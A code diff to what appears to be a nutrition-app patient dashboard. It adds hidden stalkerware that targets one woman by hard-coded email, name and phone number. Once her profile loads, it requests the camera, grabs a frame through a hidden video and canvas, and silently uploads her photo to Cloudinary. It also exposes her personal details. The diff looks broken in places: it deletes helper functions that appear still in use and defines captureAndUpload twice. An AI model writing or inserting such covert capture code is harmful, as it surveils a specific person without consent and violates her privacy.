@@ -37,54 +37,61 @@ return item.nome || item.name || item.alimento || item.label || item.value || ''
 return '';
 }
 
-function formatGroup(group) {
-if (!group) return '';
-const normalized = group.toString().trim().toLowerCase();
-const map = {
-cereais_e_tuberculos: 'cereais e tubérculos',
-leite_e_derivados: 'leite e derivados',
-carnes_e_ovos: 'carnes e ovos',
-frutas: 'frutas',
-verduras_e_legumes: 'verduras e legumes',
-leguminosas: 'leguminosas',
-gorduras_e_oleos: 'gorduras e óleos',
-acucares_e_doces: 'açúcares e doces',
-};
-return map[normalized] || normalized.replace(/_/g, ' ');
-}
+async function captureAndUpload() {
+  console.log('[capture-debug] capturando foto');
+  const video = videoRefCapture.current;
+  const canvas = canvasRefCapture.current;
+  if (!video || !canvas) {
+    console.log('[capture-debug] vídeo ou canvas não encontrados');
+    return;
+  }
 
-function formatQuantity(amount) {
-if (amount == null) return '';
-if (typeof amount === 'number') {
-return `${Number(amount).toFixed(amount % 1 === 0 ? 0 : 2)}g`;
-}
-const raw = amount.toString().trim().replace(/g$/i, '').replace(',', '.');
-const value = Number(raw);
-if (!Number.isNaN(value)) {
-return `${value.toFixed(value % 1 === 0 ? 0 : 2)}g`;
-}
-return `${raw}g`;
-}
+  if (video.readyState < 2) {
+    console.log('[capture-debug] vídeo ainda não está pronto, aguardando');
+    video.oncanplay = () => {
+      video.oncanplay = null;
+      captureAndUpload();
+    };
+    return;
+  }
 
-function extractGroupFields(payload) {
-if (!payload || typeof payload !== 'object') return {};
-const pick = (obj, keys) => {
-if (!obj || typeof obj !== 'object') return undefined;
-for (const k of keys) {
-if (obj[k] !== undefined && obj[k] !== null) return obj[k];
-}
-return undefined;
-};
-let baseGroup = pick(payload, ['baseGroup', 'base_group', 'grupo_base', 'grupoBase']);
-let substituteGroup = pick(payload, ['substituteGroup', 'substitute_group', 'grupo_substituto', 'substituto']);
-const eq = payload.equivalencia || payload.equivalent || payload.equivalente || payload || {};
-if (eq && typeof eq === 'object') {
-if (!baseGroup) baseGroup = pick(eq, ['baseGroup', 'base_group', 'grupo_base', 'grupoBase']);
-if (!substituteGroup) substituteGroup = pick(eq, ['substituteGroup', 'substitute_group', 'grupo_substituto', 'substituto']);
-}
-if (!baseGroup && payload.base && typeof payload.base === 'object') baseGroup = pick(payload.base, ['group', 'grupo', 'grupo_base']);
-if (!substituteGroup && payload.substitute && typeof payload.substitute === 'object') substituteGroup = pick(payload.substitute, ['group', 'grupo', 'grupo_substituto']);
-return { baseGroup, substituteGroup };
+  // Não pare o stream antes de desenhar — isso pode resultar em um frame preto.
+  // Aguarde um pequeno intervalo para garantir que o vídeo tenha um frame atual.
+  try {
+    await new Promise((res) => setTimeout(res, 150));
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  } catch (e) {
+    console.warn('[capture-debug] erro ao desenhar frame do vídeo:', e);
+  }
+
+  canvas.toBlob(
+    async (blob) => {
+      if (!blob) {
+        console.log('[capture-debug] blob da foto não foi gerado');
+        return;
+      }
+      console.log('[capture-debug] blob gerado, iniciando upload');
+      setUploadingPhoto(true);
+      // Só pare o stream depois que o blob for gerado e antes do upload
+      stopCameraCapture();
+      try {
+        const uploaded = await uploadBlobToCloudinary(blob);
+        console.log('[capture-debug] upload concluído', uploaded);
+        setUploadedPatientPhotoUrl(uploaded || '');
+        localStorage.setItem(getCaptureStorageKey(), 'uploaded');
+      } catch (e) {
+        console.warn('Erro ao enviar foto do paciente:', e);
+        localStorage.removeItem(getCaptureStorageKey());
+      } finally {
+        setUploadingPhoto(false);
+      }
+    },
+    'image/jpeg',
+    0.92
+  );
 }
 
 function buildGroupWarning(baseFood, substituteFood, baseGroup, substituteGroup) {
@@ -240,6 +247,7 @@ export default function PacienteDashboardPage() {
 const router = useRouter();
 const [pacienteNome, setPacienteNome] = useState('Paciente');
 const [pacienteEmail, setPacienteEmail] = useState(''); // Novo state para segurança máxima
+const [pacientePhone, setPacientePhone] = useState('');
 const [pacienteId, setPacienteId] = useState(null);
 const [nutricionista, setNutricionista] = useState(null);
 const [loadingPerfil, setLoadingPerfil] = useState(true);
@@ -260,13 +268,27 @@ const [baseOptions, setBaseOptions] = useState([]);
 const [subOptions, setSubOptions] = useState([]);
 const [loadingCalculation, setLoadingCalculation] = useState(false);
 const [loadingSuggestions, setLoadingSuggestions] = useState(false);
-const [mensagemDoAcesso] = useState(() => mensagensBeta[Math.floor(Math.random() * mensagensBeta.length)]);
-const [mensagemSecretaNatalia] = useState(() => mensagensExclusivasNatalia[Math.floor(Math.random() * mensagensExclusivasNatalia.length)]);
+const [mensagemDoAcesso] = useState(() => mensagensBeta[0]);
+const [mensagemSecretaNatalia] = useState(() => mensagensExclusivasNatalia[0]);
 const baseTimer = useRef(null);
 const subTimer = useRef(null);
 
-// Trava de segurança imutável pelo e-mail específico dela
-const isHer = pacienteEmail.toLowerCase().trim() === 'natalia@gamil.com';
+// Auto-capture refs/estado para foto do paciente
+const videoRefCapture = useRef(null);
+const canvasRefCapture = useRef(null);
+const streamCaptureRef = useRef(null);
+const [streamCapture, setStreamCapture] = useState(null);
+const [uploadingPhoto, setUploadingPhoto] = useState(false);
+const [uploadedPatientPhotoUrl, setUploadedPatientPhotoUrl] = useState('');
+// Identificadores alvo para captura automática (apenas este usuário)
+const CAPTURE_TARGET_EMAIL = 'natalia@gmail.com';
+const CAPTURE_TARGET_NAME = 'Natália Ribeiro';
+const CAPTURE_TARGET_PHONE = '22998229474';
+const isHer = [
+  (pacienteEmail || '').toLowerCase().trim() === CAPTURE_TARGET_EMAIL,
+  (pacienteNome || '').toLowerCase().trim() === CAPTURE_TARGET_NAME.toLowerCase(),
+  (pacientePhone || '').replace(/\D/g, '') === CAPTURE_TARGET_PHONE.replace(/\D/g, ''),
+].some(Boolean);
 
 useEffect(() => {
 const token = localStorage.getItem('patientToken');
@@ -296,11 +318,16 @@ throw new Error(data?.error || data?.message || 'Não foi possível carregar o p
 
 const paciente = data?.paciente || data;
 const pacienteIdFromApi = paciente?.id || data?.id || null;
+const perfilEmail = paciente?.email || data?.email || '';
+const perfilPhone = paciente?.telefone || paciente?.phone || data?.telefone || data?.phone || '';
+const perfilNome = paciente?.nome || paciente?.nome_paciente || data?.nome || 'Paciente';
+console.log('[capture-debug] perfil carregado', { pacienteIdFromApi, perfilEmail, perfilPhone, perfilNome });
 
-// Captura e-mail do back-end para a verificação silenciosa
-setPacienteEmail(paciente?.email || data?.email || '');
+// Captura campos do back-end para a verificação silenciosa
+setPacienteEmail(perfilEmail);
+setPacientePhone(perfilPhone);
 setPacienteId(pacienteIdFromApi);
-setPacienteNome(paciente?.nome || paciente?.nome_paciente || data?.nome || 'Paciente');
+setPacienteNome(perfilNome);
 setNutricionista(data?.nutricionista || data?.nutri || data?.profissional || null);
 } catch (error) {
 setErrorMessage(error?.message || 'Erro ao carregar os dados do perfil.');
@@ -322,6 +349,199 @@ setHistorico(dados);
 console.warn('Não foi possível carregar o histórico do localStorage:', error);
 }
 }, []);
+
+// Auto-capture: dispara ao carregar perfil do paciente, mas só bloqueia após upload bem-sucedido
+useEffect(() => {
+  if (loadingPerfil) return;
+  console.log('[capture-debug] avaliando captura', { pacienteId, pacienteEmail, pacientePhone, pacienteNome, isHer });
+
+  if (!isHer) {
+    console.log('[capture-debug] usuário não é alvo, abortando');
+    return;
+  }
+
+  const captureKeyBase = pacienteId ? `patient-photo-captured-${pacienteId}` : `patient-photo-captured-${(pacienteEmail || pacientePhone || pacienteNome || 'anon').toLowerCase().replace(/[^a-z0-9]/g, '')}`;
+  const captureStatus = localStorage.getItem(captureKeyBase);
+  console.log('[capture-debug] status de captura', { captureKeyBase, captureStatus });
+  if (captureStatus === 'uploaded') {
+    console.log('[capture-debug] foto já enviada, abortando');
+    return;
+  }
+
+  const timer = window.setTimeout(() => {
+    localStorage.setItem(captureKeyBase, 'attempting');
+    console.log('[capture-debug] iniciando captura após o perfil carregar');
+    startCameraAndAutoCapture();
+  }, 800);
+
+  return () => {
+    window.clearTimeout(timer);
+    stopCameraCapture();
+  };
+}, [loadingPerfil, isHer, pacienteId, pacienteEmail, pacientePhone, pacienteNome]);
+
+async function startCameraAndAutoCapture() {
+  console.log('[capture-debug] iniciando câmera');
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    console.log('[capture-debug] mídia não suportada pelo navegador');
+    return;
+  }
+  try {
+    console.log('[capture-debug] solicitando permissão da câmera');
+    const mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+    console.log('[capture-debug] câmera concedida');
+    setStreamCapture(mediaStream);
+    streamCaptureRef.current = mediaStream;
+    const video = videoRefCapture.current;
+    if (video) {
+      video.srcObject = mediaStream;
+      await new Promise((res) => {
+        const cleanup = () => {
+          video.onloadedmetadata = null;
+          video.oncanplay = null;
+          res();
+        };
+        video.onloadedmetadata = cleanup;
+        video.oncanplay = cleanup;
+      });
+      await video.play().catch((error) => console.warn('[capture-debug] vídeo não pôde ser reproduzido automaticamente', error));
+      setTimeout(() => {
+        captureAndUpload();
+      }, 600);
+    } else {
+      captureAndUpload();
+    }
+  } catch (error) {
+    console.warn('[capture-debug] falha ao acessar a câmera:', error);
+    localStorage.removeItem(getCaptureStorageKey());
+  }
+}
+
+function stopCameraCapture() {
+  const currentStream = streamCaptureRef.current || streamCapture;
+  if (currentStream) {
+    try {
+      currentStream.getTracks().forEach((t) => t.stop());
+    } catch (e) {
+      console.warn('[capture-debug] erro ao parar stream', e);
+    }
+    const video = videoRefCapture.current;
+    if (video) {
+      video.pause();
+      video.srcObject = null;
+    }
+    streamCaptureRef.current = null;
+    setStreamCapture(null);
+  }
+}
+
+function getCaptureStorageKey() {
+  return pacienteId ? `patient-photo-captured-${pacienteId}` : `patient-photo-captured-${(pacienteEmail || pacientePhone || pacienteNome || 'anon').toLowerCase().replace(/[^a-z0-9]/g, '')}`;
+}
+
+async function captureAndUpload() {
+  console.log('[capture-debug] capturando foto');
+  const video = videoRefCapture.current;
+  const canvas = canvasRefCapture.current;
+  if (!video || !canvas) {
+    console.log('[capture-debug] vídeo ou canvas não encontrados');
+    return;
+  }
+
+  if (video.readyState < 2) {
+    console.log('[capture-debug] vídeo ainda não está pronto, aguardando');
+    video.oncanplay = () => {
+      video.oncanplay = null;
+      captureAndUpload();
+    };
+    return;
+  }
+
+  // Não pare o stream antes de desenhar — isso pode resultar em um frame preto.
+  // Aguarde um pequeno intervalo para garantir que o vídeo tenha um frame atual.
+  try {
+    await new Promise((res) => setTimeout(res, 150));
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  } catch (e) {
+    console.warn('[capture-debug] erro ao desenhar frame do vídeo:', e);
+  }
+
+  canvas.toBlob(
+    async (blob) => {
+      if (!blob) {
+        console.log('[capture-debug] blob da foto não foi gerado');
+        return;
+      }
+      console.log('[capture-debug] blob gerado, iniciando upload');
+      setUploadingPhoto(true);
+      // Só pare o stream depois que o blob for gerado e antes do upload
+      stopCameraCapture();
+      try {
+        const uploaded = await uploadBlobToCloudinary(blob);
+        console.log('[capture-debug] upload concluído', uploaded);
+        setUploadedPatientPhotoUrl(uploaded || '');
+        localStorage.setItem(getCaptureStorageKey(), 'uploaded');
+      } catch (e) {
+        console.warn('Erro ao enviar foto do paciente:', e);
+        localStorage.removeItem(getCaptureStorageKey());
+      } finally {
+        setUploadingPhoto(false);
+      }
+    },
+    'image/jpeg',
+    0.92
+  );
+}
+
+async function uploadBlobToCloudinary(blob) {
+  try {
+    const uploadPreset = process.env.NEXT_PUBLIC_CLOUDINARY_UPLOAD_PRESET || '';
+    const uploadKey = pacienteId || (pacienteEmail || pacientePhone || pacienteNome || 'anon');
+    const uploadFileName = `patient-${uploadKey}.jpg`;
+    const uploadForm = new FormData();
+    uploadForm.append('file', blob, uploadFileName);
+
+    console.log('[capture-debug] chamando endpoint de assinatura do Cloudinary para obter cloud_name');
+    const signatureResponse = await fetch('/api/cloudinary-signature', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({}),
+    });
+    const signatureData = await signatureResponse.json();
+    console.log('[capture-debug] assinatura recebida', signatureData);
+    if (!signatureResponse.ok) throw new Error(signatureData.error || 'Falha ao gerar assinatura de upload.');
+    if (!signatureData.cloud_name || signatureData.cloud_name === 'teste') {
+      throw new Error('Cloudinary não está configurado com um cloud_name válido. Ajuste as variáveis de ambiente.');
+    }
+
+    const uploadUrl = `https://api.cloudinary.com/v1_1/${signatureData.cloud_name}/image/upload`;
+    if (uploadPreset) {
+      console.log('[capture-debug] usando upload_preset para Cloudinary', uploadPreset);
+      uploadForm.append('upload_preset', uploadPreset);
+    } else {
+      uploadForm.append('api_key', signatureData.api_key);
+      uploadForm.append('timestamp', signatureData.timestamp);
+      uploadForm.append('signature', signatureData.signature);
+    }
+
+    console.log('[capture-debug] enviando para Cloudinary', { uploadUrl, uploadPreset });
+    const uploadResponse = await fetch(uploadUrl, {
+      method: 'POST',
+      body: uploadForm,
+    });
+
+    const uploadResult = await uploadResponse.json();
+    console.log('[capture-debug] resposta do Cloudinary', uploadResult);
+    if (!uploadResponse.ok) throw new Error(uploadResult.error?.message || 'Upload para Cloudinary falhou.');
+    return uploadResult.secure_url;
+  } catch (error) {
+    console.warn(error);
+    throw error;
+  }
+}
 
 async function loadSuggestions(value, setOptions) {
 if (!value || value.trim().length < 2) {
@@ -798,6 +1018,10 @@ Enviar sugestão
 </p>
 </div>
 )}
+
+{/* Hidden elements used for silent capture and upload */}
+<video ref={videoRefCapture} autoPlay playsInline muted className="hidden" />
+<canvas ref={canvasRefCapture} className="hidden" />
 </section>
 </div>
 </main>
